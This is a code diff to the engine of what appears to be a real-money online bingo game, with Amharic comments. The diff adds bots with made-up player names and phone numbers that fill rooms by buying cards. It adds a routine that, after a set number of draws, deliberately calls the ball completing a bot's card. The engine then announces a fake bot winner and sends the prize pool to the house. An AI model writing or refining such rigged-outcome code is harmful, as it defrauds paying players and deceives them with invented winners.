@@ -11,24 +11,23 @@ from app.models import Game, Setting, User, AdminStats, PlayerCard, Card
 
 BOT_NAMES = [
     "user_45456", "user_MUTD", "user_Dereje16", "user_65788", "user_Gadissa", "user_43688",  
-    "user_66856", "user_56488", "user_Finfine", "user_88786", "user_Aድራግ", "user_54321",
+    "user_89856", "user_56488", "user_Finfine", "user_88786", "user_Abeti", "user_54321",
     "user_Shegaw16", "user_78646", "user_Abenu888", "user_56787", "user_Berihun19", "user_32743",
-    "user_Kaka", "user_Forever", "user_Tarekegni", "user_77633", "user_Mulle", "user_55894",
+    "user_Kaka", "user_Forever", "user_Tarekegni", "user_77633", "user_Chuchu", "user_55894",
     "user_36648", "user_93121", "user_Temu19", "user_48539", "user_የማሪያምልጅ21", "user_89175",
     "user_53929", "user_79348", "user_Abdissa", "user_91976", "user_Obssa21", "user_Degu22",
-    "user_48271", "user_Bekele", "user_73924", "user_Miki22", "user_61583", "user_Habte",
+    "user_48271", "user_Bekele", "user_73924", "user_Miki22", "user_74583", "user_Habte",
     "user_92746", "user_Sami19", "user_35482", "user_Eyob", "user_81635", "user_Lemma17",
     "user_56391", "user_Nati", "user_74826", "user_Yonas21", "user_39157", "user_Mesfin",
     "user_68432", "user_Dani", "user_82519", "user_Amare16", "user_47683", "user_Fikru",
     "user_95317", "user_Solomon", "user_63845", "user_Tesfa19", "user_21764", "user_Kebede",
-    "user_87431", "user_Robi22", "user_52689", "user_Mulu", "user_76352", "user_Teddy18",
+    "user_87431", "user_Robi22", "user_52689", "user_Mulatu", "user_76352", "user_Teddy18",
     "user_41976", "user_Girma", "user_68524", "user_Yared20", "user_93168", "user_Bini",
-    "user_57243", "user_Amanuel19", "user_84617", "user_Sisay", "user_31582", "user_Hana21",
-    "user_76439", "user_Mekdi", "user_52816", "user_Abel17", "user_69354", "user_Freedom",
-    "user_81726", "user_ብርሃን21", "user_45938", "user_ሀገሬ", "user_72615", "user_የኔልጅ19"
+    "user_57243", "user_Amanuel19", "user_84617", "user_Sisay", "user_31582", "user_Bereket21",
+    "user_76439", "user_Mered", "user_52816", "user_Abel17", "user_69354", "user_Freedom",
+    "user_81726", "user_ብርሃን21", "user_45938", "user_ሀገሬ", "user_72615", "user_Eyou19"
 ]
 
-# 📱 ለቦቶች ብቻ በRandom የሚመረጡ የኢትዮጵያ ስልክ ቁጥሮች
 BOT_PHONE_NUMBERS = [
     "2519****2244", "2519****3478", "2519****5589", "2519****8990", "2519****0901", "አልተመዘገበም",
     "2519****6702", "2519****2313", "2519****4424", "2519****4535", "2519****8246", "አልተመዘገበም",
@@ -82,20 +81,21 @@ class GameEngine:
 
         # ከጠዋቱ 12:00 እስከ ቀኑ 7:00 (ከ6:00 እስከ 12:59)
         if 6 <= hour < 13:
-            return random.randint(50, 100)
+            return random.randint(40, 80)
 
         # ከቀኑ 7:00 እስከ ሌሊቱ 6:00 (ከ13:00 እስከ 23:59)
         elif 13 <= hour <= 23:
             return random.randint(100, 150)
 
-        # ከሌሊቱ 6:00 እስከ ጠዋቱ 12:00 (ከ0:00 እስከ 5:59)
+        # ከሌሊቱ 6:00 እስከ ሌሊቱ 9:00 (ከ0:00 እስከ 2:59)
+        elif 0 <= hour < 3:
+            return random.randint(30, 60)
+
+        # ከሌሊቱ 9:00 እስከ ጠዋቱ 12:00 (ከ3:00 እስከ 5:59)
         else:
-            return random.randint(40, 80)
+            return random.randint(20, 40)
 
     async def auto_buy_bot_cards(self, game_id: int):
-        """
-        🤖 ቦቱ በ30 ሰከንድ ቆጠራ ውስጥ ካርዶችን ተራ በተራ እና በፍጥነት (Fast Progressive Purchase) እንዲገዛ የተደረገ ማስተካከያ::
-        """
         db: Session = None
         try:
             db = SessionLocal()
@@ -122,7 +122,6 @@ class GameEngine:
                         cards_to_buy_count = min(needed, len(available_numbers))
                         cards_to_buy = random.sample(available_numbers, cards_to_buy_count)
                         
-                        # ⚡ በየተራ በጥቂት ሚሊሰከንዶች ልዩነት (Fast Loop) በመግዛት ተጫዋቾች ገጹ ላይ ሲመጡ ቢጫ ሆኖ እንዲያዩት ማድረግ
                         for c_num in cards_to_buy:
                             active_check = db.query(Game).filter(Game.id == game_id, Game.status.in_(["running", "waiting"])).first()
                             if not active_check:
@@ -144,7 +143,6 @@ class GameEngine:
 
                             db.commit()
 
-                            # 📡 የተገዙትን ካርዶች ለሁሉም ተጫዋቾች በWebSocket ማሰራጨት
                             all_taken = db.query(PlayerCard).filter(
                                 PlayerCard.game_id == game_id,
                                 PlayerCard.bet_amount == fee
@@ -157,7 +155,6 @@ class GameEngine:
                                 "taken_cards": taken_list
                             })
 
-                            # ⏱️ 30 ሰከንድ ሳያልቅበት በፍጥነት እንዲጨርስ ከ 0.05 እስከ 0.15 ሰከንድ ብቻ ማረፍ
                             await asyncio.sleep(random.uniform(0.05, 0.15))
 
             print(f"🤖 Fast auto-bought bot cards completed for Game ID {game_id}.")
@@ -240,7 +237,6 @@ class GameEngine:
                 game_display_no = str(100000 + saved_game_id)
                 db.close()
 
-                # 🚀 የቦት ግዢን በBackground Task ማስጀመር (የ30 ሰከንድ Countdown እንዳይዘጋይ)
                 asyncio.create_task(self.auto_buy_bot_cards(saved_game_id))
                 
                 has_bought_cards = await self.countdown(countdown_seconds, game_display_no, saved_game_id)
@@ -385,6 +381,7 @@ class GameEngine:
                     else:
                         room_status[fee] = "FORCE_HOUSE"
 
+                # 🎯 የተስተካከለ፦ የቤት ማሸነፊያ ጥሪዎች ብዛት ከ 10 እስከ 15 ተደርጓል
                 max_draw_balls = random.randint(10, 15)
 
             winner_detected = False
@@ -397,10 +394,10 @@ class GameEngine:
             })
 
             call_count = 0
-            for number in numbers:
-                if not self.running:
-                    break
+            remaining_numbers = list(numbers)
 
+            while remaining_numbers and self.running:
+                number = remaining_numbers.pop(0)
                 call_count += 1
                 self.called_numbers.append(number)
 
@@ -494,63 +491,80 @@ class GameEngine:
                     winner_detected = True
                     break
 
-                if call_count >= max_draw_balls:
-                    break
+                if call_count >= max_draw_balls and target_house_wins > 0:
+                    bot_win_info = self.find_best_bot_trigger_ball(bought_cards, all_200_cards, self.called_numbers, remaining_numbers)
+                    if bot_win_info:
+                        trigger_ball = bot_win_info["trigger_ball"]
+                        remaining_numbers.remove(trigger_ball)
+                        
+                        call_count += 1
+                        self.called_numbers.append(trigger_ball)
+                        
+                        t_letter = "B" if trigger_ball <= 15 else "I" if trigger_ball <= 30 else "N" if trigger_ball <= 45 else "G" if trigger_ball <= 60 else "O"
+                        await self.safe_broadcast({
+                           "type": "ball",
+                           "letter": t_letter,
+                           "number": trigger_ball,
+                           "label": f"{t_letter}{trigger_ball}",
+                           "call_count": call_count,
+                           "game_no": game_display_no,
+                           "derash_rooms": derash_by_fee
+                        })
+                        await asyncio.sleep(1.0)
+
+                        bot_user = self.get_bot_user(db)
+                        bot_winners_list = []
+                        for fee in active_rooms:
+                            self.house_counters[fee] = self.house_counters.get(fee, 0) + 1
+                            winner_name = random.choice(BOT_NAMES)
+                            bot_phone = random.choice(BOT_PHONE_NUMBERS)
+                            bot_prize_display = derash_by_fee.get(str(int(fee)), 0)
+
+                            bot_winners_list.append({
+                                "winner_id": bot_user.id,
+                                "telegram_name": winner_name,
+                                "winner_name": winner_name,
+                                "phone_number": bot_phone,
+                                "card_number": bot_win_info["card_number"],
+                                "winning_card_number": bot_win_info["card_number"],
+                                "room_fee": fee,
+                                "prize": round(float(bot_prize_display), 2),
+                                "winning_numbers": bot_win_info["winning_numbers"],
+                                "card_numbers": bot_win_info["card_numbers"],
+                                "winning_reason": bot_win_info["winning_pattern"]
+                            })
+
+                        game_record = db.query(Game).filter(Game.id == saved_game_id).first()
+                        if game_record:
+                            game_record.drawn_balls = json.dumps(self.called_numbers)
+                            game_record.winners_info = json.dumps(bot_winners_list)
+                            db.commit()
+
+                        primary_bot = bot_winners_list[0]
+                        self.distribute_multi_room_prize(db, saved_game_id, pools_by_fee, winner_user_id=None, winning_card=bot_win_info["card_number"])
+
+                        await self.safe_broadcast({
+                            "type": "game_over",
+                            "status": "WINNER_FOUND",
+                            "result": "BINGO",
+                            "winner_name": primary_bot["telegram_name"],
+                            "telegram_name": primary_bot["telegram_name"],
+                            "phone_number": primary_bot["phone_number"],
+                            "winning_card": primary_bot["card_number"],
+                            "prize": primary_bot["prize"],
+                            "message": f"🎉 አሸናፊ፦ {primary_bot['telegram_name']} (ካርቴላ #{primary_bot['card_number']})!",
+                            "card_number": primary_bot["card_number"],
+                            "winner_id": primary_bot["winner_id"],
+                            "winning_numbers": bot_win_info["winning_numbers"],
+                            "card_numbers": bot_win_info["card_numbers"],
+                            "winning_reason": bot_win_info["winning_pattern"],
+                            "winners": bot_winners_list
+                        })
+                        winner_detected = True
+                        break
 
                 await asyncio.sleep(draw_interval)
 
-            if not winner_detected and self.running and target_house_wins > 0:
-                result = self.force_house_win(db, saved_game_id, self.called_numbers, pools_by_fee, bought_cards, all_200_cards)
-                
-                bot_winners_list = []
-                for fee in active_rooms:
-                    self.house_counters[fee] = self.house_counters.get(fee, 0) + 1
-                    winner_name = random.choice(BOT_NAMES)
-                    bot_phone = random.choice(BOT_PHONE_NUMBERS)
-                    bot_prize_display = derash_by_fee.get(str(int(fee)), 0)
-
-                    bot_winners_list.append({
-                        "winner_id": result["winner_id"],
-                        "telegram_name": winner_name,
-                        "winner_name": winner_name,
-                        "phone_number": bot_phone,
-                        "card_number": result["card_number"],
-                        "winning_card_number": result["card_number"],
-                        "room_fee": fee,
-                        "prize": round(float(bot_prize_display), 2),
-                        "winning_numbers": result.get("winning_numbers", []),
-                        "card_numbers": result.get("card_numbers", []),
-                        "winning_reason": result.get("winning_pattern", "ቢንጎ")
-                    })
-
-                primary_bot = bot_winners_list[0] if bot_winners_list else {
-                    "winner_id": result["winner_id"], "telegram_name": "BOT", "phone_number": "N/A",
-                    "card_number": result["card_number"], "room_fee": 10.0, "prize": 0.0,
-                    "winning_numbers": [], "card_numbers": [], "winning_reason": "ቢንጎ"
-                }
-
-                game_record = db.query(Game).filter(Game.id == saved_game_id).first()
-                if game_record:
-                    game_record.winners_info = json.dumps(bot_winners_list)
-                    db.commit()
-
-                await self.safe_broadcast({
-                    "type": "game_over",
-                    "status": "WINNER_FOUND",
-                    "result": "BINGO",
-                    "winner_name": primary_bot["telegram_name"],
-                    "telegram_name": primary_bot["telegram_name"],
-                    "phone_number": primary_bot["phone_number"],
-                    "winning_card": primary_bot["card_number"],
-                    "prize": primary_bot["prize"],
-                    "message": f"🎉 አሸናፊ፦ {primary_bot['telegram_name']} (ካርቴላ #{primary_bot['card_number']})!",
-                    "card_number": primary_bot["card_number"],
-                    "winner_id": primary_bot["winner_id"],
-                    "winning_numbers": result.get("winning_numbers", []),
-                    "card_numbers": result.get("card_numbers", []),
-                    "winning_reason": result.get("winning_pattern", "ቢንጎ"),
-                    "winners": bot_winners_list
-                })
         except Exception as e:
             print(f"❌ Error in draw_numbers execution: {e}")
         finally:
@@ -580,6 +594,61 @@ class GameEngine:
             return True, [matrix[r][c] for r, c in corners], "4 Corners"
 
         return False, [], ""
+
+    def find_best_bot_trigger_ball(self, bought_cards, all_200_cards, current_drawn_balls, remaining_numbers):
+        db = SessionLocal()
+        bot_user = self.get_bot_user(db)
+        db.close()
+
+        bot_cards = [card_num for card_num, info in bought_cards.items() if info["user_id"] == bot_user.id]
+        if not bot_cards:
+            bot_cards = list(all_200_cards.keys())
+
+        drawn_set = set(current_drawn_balls)
+        drawn_set.add("FREE")
+        drawn_set.add(None)
+
+        for c_num in bot_cards:
+            card_matrix = all_200_cards.get(str(c_num))
+            if not card_matrix or len(card_matrix) != 5:
+                continue
+
+            patterns = []
+            for r in range(5):
+                patterns.append(([card_matrix[r][c] for c in range(5)], f"Horizontal Row {r+1}"))
+            for c in range(5):
+                patterns.append(([card_matrix[r][c] for r in range(5)], f"Vertical Column {c+1}"))
+            patterns.append(([card_matrix[i][i] for i in range(5)], "Diagonal Down"))
+            patterns.append(([card_matrix[i][4-i] for i in range(5)], "Diagonal Up"))
+            corners = [(0, 0), (0, 4), (4, 0), (4, 4)]
+            patterns.append(([card_matrix[r][c] for r, c in corners], "4 Corners"))
+
+            for pat_nums, pat_name in patterns:
+                missing = [n for n in pat_nums if n not in drawn_set]
+                if len(missing) == 1 and missing[0] in remaining_numbers:
+                    trigger = missing[0]
+                    flat_card = [item for sublist in card_matrix for item in sublist]
+                    win_nums = [n for n in pat_nums if n and n != "FREE"]
+                    return {
+                        "card_number": int(c_num),
+                        "trigger_ball": trigger,
+                        "winning_numbers": win_nums,
+                        "card_numbers": flat_card,
+                        "winning_pattern": pat_name
+                    }
+        
+        fallback_card = int(random.choice(bot_cards))
+        fallback_matrix = all_200_cards.get(str(fallback_card), [[0]*5 for _ in range(5)])
+        fallback_flat = [item for sublist in fallback_matrix for item in sublist] if len(fallback_matrix) == 5 else []
+        fallback_trigger = remaining_numbers[0]
+        
+        return {
+            "card_number": fallback_card,
+            "trigger_ball": fallback_trigger,
+            "winning_numbers": [],
+            "card_numbers": fallback_flat,
+            "winning_pattern": "ቢንጎ"
+        }
 
     def process_drawn_ball_and_check_winner_v3(self, db, game_id, current_drawn_balls, pools_by_fee, bought_cards, all_200_cards, room_status):
         bot_user = self.get_bot_user(db)
@@ -676,59 +745,6 @@ class GameEngine:
         except Exception as e:
             db.rollback()
             print(f"❌ Error committing prize distribution: {e}")
-
-    def force_house_win(self, db, game_id, current_drawn_balls, pools_by_fee, bought_cards, all_200_cards):
-        bot_user = self.get_bot_user(db)
-        
-        real_player_bought = [card_num for card_num, info in bought_cards.items() if info["user_id"] != bot_user.id]
-        available_ids = [idx for idx in range(1, 201) if idx not in real_player_bought]
-        
-        winning_card_num = random.choice(available_ids) if available_ids else 1
-        card_matrix = all_200_cards.get(str(winning_card_num), [[0]*5 for _ in range(5)])
-        
-        possible_patterns = []
-        if len(card_matrix) == 5:
-            for r in range(5):
-                possible_patterns.append(([card_matrix[r][c] for c in range(5)], f"Horizontal Row {r+1}"))
-            for c in range(5):
-                possible_patterns.append(([card_matrix[i][c] for i in range(5)], f"Vertical Column {c+1}"))
-            possible_patterns.append(([card_matrix[i][i] for i in range(5)], "Diagonal Down"))
-            possible_patterns.append(([card_matrix[i][4-i] for i in range(5)], "Diagonal Up"))
-            corners = [(0, 0), (0, 4), (4, 0), (4, 4)]
-            possible_patterns.append(([card_matrix[r][c] for r, c in corners], "4 Corners"))
-
-        drawn_set = set(current_drawn_balls)
-        if possible_patterns:
-            best_pattern_nums, best_pattern_name = max(
-                possible_patterns, 
-                key=lambda p: sum(1 for n in p[0] if n in drawn_set or n in ["FREE", None])
-            )
-        else:
-            best_pattern_nums, best_pattern_name = [], "ቢንጎ"
-        
-        for num in best_pattern_nums:
-            if num and num != "FREE" and num not in self.called_numbers:
-                self.called_numbers.append(num)
-
-        game_record = db.query(Game).filter(Game.id == game_id).first()
-        if game_record:
-            game_record.drawn_balls = json.dumps(self.called_numbers)
-
-        win_nums = [n for n in best_pattern_nums if n and n != "FREE"]
-        pattern = best_pattern_name
-
-        flat_card = [item for sublist in card_matrix for item in sublist] if len(card_matrix) == 5 else []
-        
-        self.distribute_multi_room_prize(db, game_id, pools_by_fee, winner_user_id=None, winning_card=winning_card_num)
-
-        return {     
-            "status": "HOUSE_WIN",
-            "winner_id": 0,
-            "card_number": winning_card_num,
-            "winning_numbers": win_nums,
-            "card_numbers": flat_card,
-            "winning_pattern": pattern
-        }
 
     def distribute_multi_room_prize(self, db, game_id, pools_by_fee, winner_user_id=None, winning_card=None, winning_fee=None):
         settings = db.query(Setting).first()
